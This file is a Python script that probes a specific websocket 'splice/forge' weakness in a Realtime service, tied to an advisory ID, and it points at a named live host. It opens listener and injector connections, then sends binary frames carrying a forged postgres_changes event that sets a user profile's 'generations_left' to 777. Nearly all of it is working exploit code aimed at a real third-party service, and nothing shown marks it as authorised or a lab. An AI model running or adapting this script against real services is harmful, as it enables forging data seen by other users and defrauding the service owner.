#!/usr/bin/env python3
# Focused Realtime splice/forge probe (GHSA-9vjf-j9f7-j42c) with V1 serializer (vsn=1.0.0).
import base64, json, os, socket, ssl, struct, sys, time
sys.stdout.reconfigure(encoding="utf-8")
HOST = "cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TOPIC = "realtime:profiles_changes"

class WS:
    def __init__(self, label):
        self.label = label; self.buf = b""; self.sock = None
    def connect(self):
        ctx = ssl.create_default_context()
        raw = socket.create_connection((HOST, 443), timeout=15)
        self.sock = ctx.wrap_socket(raw, server_hostname=HOST); self.sock.settimeout(12)
        key = base64.b64encode(os.urandom(16)).decode()
        req = (f"GET /realtime/v1/websocket?apikey={PK}&vsn=1.0.0 HTTP/1.1\r\nHost: {HOST}\r\n"
               f"Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
               f"Sec-WebSocket-Version: 13\r\nUser-Agent: Mozilla/5.0\r\nOrigin: https://onlyfakeai.ru\r\n\r\n")
        self.sock.sendall(req.encode())
        hdrs = b""
        while b"\r\n\r\n" not in hdrs:
            c = self.sock.recv(4096)
            if not c: break
            hdrs += c
        head, _, rest = hdrs.partition(b"\r\n\r\n"); self.buf = rest
        print(f"[{self.label}] {head.split(b'\r\n')[0].decode()}")
        self.sock.settimeout(0.4)
    def send_frame(self, opcode, payload):
        mask = os.urandom(4); n = len(payload)
        hdr = bytes([0x80 | opcode])
        if n < 126: hdr += bytes([0x80 | n])
        elif n < 65536: hdr += bytes([0x80 | 126]) + struct.pack(">H", n)
        else: hdr += bytes([0x80 | 127]) + struct.pack(">Q", n)
        self.sock.sendall(hdr + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(payload)))
    def send_json(self, o): self.send_frame(1, json.dumps(o).encode())
    def send_bin(self, b): self.send_frame(2, b)
    def read_exact(self, n, t):
        end = time.time() + t
        while len(self.buf) < n:
            if time.time() > end: raise TimeoutError
            try: c = self.sock.recv(65536)
            except socket.timeout: continue
            if not c: raise ConnectionError("closed")
            self.buf += c
        out, self.buf = self.buf[:n], self.buf[n:]
        return out
    def recv(self, t=0.4):
        try:
            b1, b2 = self.read_exact(2, t)
        except (TimeoutError, socket.timeout):
            return None
        op = b1 & 0x0F; masked = b2 & 0x80; ln = b2 & 0x7F
        if ln == 126: ln = struct.unpack(">H", self.read_exact(2, t))[0]
        elif ln == 127: ln = struct.unpack(">Q", self.read_exact(8, t))[0]
        mk = self.read_exact(4, t) if masked else b""
        p = self.read_exact(ln, t) if ln else b""
        if masked: p = bytes(c ^ mk[i % 4] for i, c in enumerate(p))
        if op == 9:
            self.send_frame(10, p); return self.recv(t)
        return op, p
    def drain(self, secs):
        end = time.time() + secs; got = []
        while time.time() < end:
            f = self.recv(0.3)
            if f is None: continue
            op, p = f
            if op == 8:
                print(f"[{self.label}] CLOSE {p[:120]}"); break
            s = p.decode("utf-8", "replace")
            try:
                j = json.loads(s)
                if j.get("event") not in ("phx_reply",):
                    print(f"[{self.label}] {op} EVENT {j.get('event')} payload={json.dumps(j.get('payload'))[:500]}")
                got.append(j)
            except Exception:
                print(f"[{self.label}] {op} UNPARSEABLE({len(p)}B): {s[:300]}")
                got.append({"raw": s})
        return got
    def join(self, topic, token=None, private=False, ref="1"):
        cfg = {"broadcast": {"self": True}, "presence": {"key": ""}, "private": private}
        payload = {"config": cfg}
        if token: payload["access_token"] = token
        self.send_json({"topic": topic, "event": "phx_join", "payload": payload, "ref": ref, "join_ref": ref})
    def close(self):
        try: self.send_frame(8, b"\x03\xe8"); self.sock.close()
        except Exception: pass

print("=== realtime splice test ===")
listener = WS("listener"); listener.connect(); listener.join(TOPIC, ref="1"); listener.drain(2.0)
injector = WS("injector"); injector.connect(); injector.join(TOPIC, ref="1"); injector.drain(2.0)

print("\n[control] text broadcast")
injector.send_json({"topic": TOPIC, "event": "broadcast",
                    "payload": {"type": "broadcast", "event": "zz-control", "payload": {"a": 1}}, "ref": "10"})
listener.drain(2.0)

print("\n[test1] binary frame with valid JSON control message")
injector.send_bin(json.dumps({"topic": TOPIC, "event": "broadcast",
                              "payload": {"type": "broadcast", "event": "zz-bin-json", "payload": {"b": 2}}, "ref": "11"}).encode())
listener.drain(2.5)

print("\n[test2] binary frame with JSON-fragment splice (forged postgres_changes)")
frag = (b'{"x":1},"event":"postgres_changes","payload":{"data":{"schema":"public","table":"profiles",'
        b'"commit_timestamp":"2026-11-11T00:00:00Z","event":"UPDATE","new":{"user_id":"00000000-0000-0000-0000-000000000000",'
        b'"generations_left":777},"old":{},"errors":null},"ids":[1]}}')
injector.send_bin(frag)
listener.drain(3.0)
print("\n[test3] binary frame with plain fragment only (no valid JSON envelope)")
injector.send_bin(b'}, "event":"postgres_changes", "payload":{"data":{}}')
listener.drain(2.5)
injector.close(); listener.close()
print("\ndone (if listener showed no UNPARSEABLE/forged frames and no CLOSE, the binary path is likely filtered/patched)")
